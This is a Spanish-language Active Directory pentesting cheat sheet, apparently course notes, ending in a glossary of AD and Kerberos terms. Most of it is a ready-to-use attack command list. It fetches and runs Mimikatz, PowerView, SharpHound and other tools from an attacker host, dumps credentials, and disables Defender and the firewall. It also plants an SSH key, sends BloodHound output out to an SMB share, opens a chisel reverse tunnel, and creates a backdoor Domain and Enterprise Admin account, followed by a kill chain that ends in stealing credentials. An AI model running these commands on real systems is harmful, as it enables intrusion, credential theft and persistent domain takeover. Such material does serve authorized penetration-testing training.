# Glosario 

Tags: #AD #Glosario 

## Tools 

```bash 
https://github.com/Spartan-Cybersecurity/CPAD-Tools        # Herramientas de ayuda 
```

## Comandos Extra AD 

```bash 
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo "ssh-rsa AAAAB3NzaC1= root@kali" >> ~/.ssh/authorized_keys

certutil.exe -f -urlcache -split http://192.168.4.12/bypass.exe
bitsadmin /transfer myJob http://192.168.4.12/EjecutaEsto.exe C:\\Windows\\Tasks\\EjecutaEsto.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerView.ps1');
certutil.exe -f -urlcache -split http://192.168.4.12/HeidiSQL.zip
IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerUpSQL.ps1');
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLServerLink -Instance localhost 
Invoke-SQLAudit -Instance localhost

IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
certutil.exe -f -urlcache -split http://192.168.4.12/mimikatz.exe
.\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit 

IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/adPEAS-Light.ps1'); Invoke-adPeas -Outputfile result-adpeas.txt
IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/SharpHound.ps1'); 
Invoke-BloodHound -CollectionMethod All -Domain Domain1.corp -ZipFileName luna.zip


(New-Object System.Net.WebClient).DownloadFile('http://192.168.4.12/PsExec64.exe', 'c:\Users\Public\PsExec64.exe')
(New-Object System.Net.WebClient).DownloadFile('http://192.168.4.12/PetitPotato.exe', 'c:\Users\Public\PetitPotato.exe')

certutil.exe -f -urlcache -split http://192.168.4.12/SharpHound.exe
.\SharpHound.exe --CollectionMethods All --Domain Domain1.corp

Set-MpPreference -DisableIOAVProtection $true -Verbose
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Get-MpPreference | select DisableIOAVProtection, DisableRealtimeMonitoring
Set-NetFirewallProfile -name Domain,Private,Public -Enabled False -Verbose
netsh advfirewall set allprofiles state off

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

net use \\192.168.4.12\kali-share /u:kali kali
copy \\192.168.4.12\kali-share\BypassCLM-bin.exe .
copy 20230915084901_BloodHound.zip \\192.168.4.12\kali-share\

iwr -uri http://192.168.4.12/chisel.exe -o c:\windows\tasks\chisel.exe
c:\windows\tasks\chisel.exe client 192.168.4.12:9090 R:9050:socks

iwr -uri http://192.168.4.12/NimScan.exe -o c:\windows\tasks\NimScan.exe
c:\windows\tasks\NimScan.exe 

IEX (New-Object Net.WebClient).DownloadString('import-module https://raw.githubusercontent.com/PowerSploit/dev/Recon/PowerView.ps1');
IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/Invoke-Portscan.ps1');
Get-DomainComputer -Properties cn | select -first 8 | %{Invoke-Portscan -Hosts $_.cn -TopPorts 50 -Threads 4}

iwr -uri http://192.168.4.12/NimScan.exe -o c:\windows\tasks\NimScan.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/winPEAS.ps1');
iwr -uri http://192.168.4.12/winPEASany.exe -o c:\windows\tasks\winPEASany.exe
IEX (New-Object Net.WebClient).DownloadString('http://192.168.4.12/PowerUp.ps1')


net user sephiroth Pass123 /add /domain
net localgroup Administrators sephiroth /add /domain
net localgroup 'Remote Desktop Users' sephiroth /add /domain
net group 'Domain Admins' sephiroth /add
net group 'Enterprise Admins' sephiroth /add
```

## CyberKillChain recomendado en AD: 

```bash 
1. Enumeracion local del equipo 
2. Escalacion de privilegios locales (Si aplica)
3. Apagar Windows Defender
4. Exfiltrar las credenciales con Mimikatz
5. Realizar un Password Spraying (opcional)
6. Realiza un reporte informal que contenga lo mas importante (hashes, contraseñas, usuarios, etc)
```

## Principales conceptos en AD: 

```bash 

1. Dominio (Domain)
- Definición: Es una entidad lógica dentro del Directorio Activo que agrupa un conjunto de objetos bajo una única política de seguridad y base de datos.
- Ejemplo: 'domain1.com' podría ser el nombre de dominio principal de una organización, bajo el cual todos los usuarios, equipos y recursos están registrados.
    
2. Objeto (Object)
- Definición: Es una entidad individual dentro del Directorio Activo, como un usuario, grupo o equipo.
- Ejemplo: 'john.doe@domain1.com' podría ser un objeto usuario en el dominio.
    
3. Árbol (Tree)
- Definición: Es una colección de uno o más dominios de Directorio Activo que comparten un espacio de nombres contiguo y una estructura jerárquica. 
- Ejemplo: Bajo el dominio 'domain1.com', podría haber subdominios como 'sales.domain1.com' y 'research.domain1.com'. Juntos, forman un árbol.
    
4. Bosque (Forest)
- Definición: Es una colección de árboles que comparten un catálogo global, esquema y operaciones maestras. Cada bosque actúa como un contenedor de seguridad.
- Ejemplo: 'domain1.com' y 'domain2.com' podrían ser dos árboles diferentes pero pertenecer al mismo bosque, compartiendo un catálogo global y políticas de seguridad.
    
5. Unidad Organizativa (OU)
- Definición: Es un contenedor dentro del Directorio Activo que puede contener usuarios, grupos, equipos y otras OUs. Ayuda a organizar y administrar recursos.
- Ejemplo: Dentro de 'domain1.com', podría haber una OU llamada "Departamento de Finanzas" que agrupa a todos los usuarios y recursos relacionados con las finanzas.
    
6. ACL (Access Control List)
- Definición: Es una lista de permisos adjuntos a un objeto que especifica qué usuarios/grupos tienen acceso al objeto y qué operaciones pueden realizar.
- Ejemplo: En la OU "Departamento de Finanzas" de 'domain1.com', podría haber una ACL que solo permita a los usuarios del departamento acceder a ciertos archivos críticos.
    
7. GPO (Group Policy Object)
- Definición: Es un conjunto de configuraciones de políticas que se pueden aplicar a usuarios o equipos dentro de un dominio. Las GPOs controlan una variedad de configuraciones, desde políticas de seguridad hasta configuraciones de software.
- Ejemplo: Una GPO en 'domain1.com' podría establecer que todas las computadoras del dominio tengan actualizaciones automáticas activadas y que se bloqueen después de 10 minutos de inactividad.
```

## Componentes Principales:

```bash 
1. Key Distribution Center (KDC): Es una instancia de confianza centralizada que provee los servicios AS y TGS.
2. Authentication Service (AS): Es el servicio dentro del KDC que autentica a los usuarios y servicios y emite TGTs.
3. Ticket Granting Service (TGS): Es otro servicio dentro del KDC que emite tickets de servicio para acceder a recursos después de que el cliente ha sido autenticado inicialmente por el AS.
4. Ticket Granting Ticket (TGT): Es un "boleto" que el AS emite a los clientes cuando se autentican con éxito, que a su vez es utilizado para solicitar tickets de servicio del TGS.
```

## Usuarios predeterminados de Active Directory:

```bash 
1. Administrator: La cuenta de administrador del dominio que tiene acceso total a todos los servidores y estaciones de trabajo del dominio.
2. Guest: Una cuenta de usuario que tiene privilegios limitados, generalmente deshabilitada por defecto.
```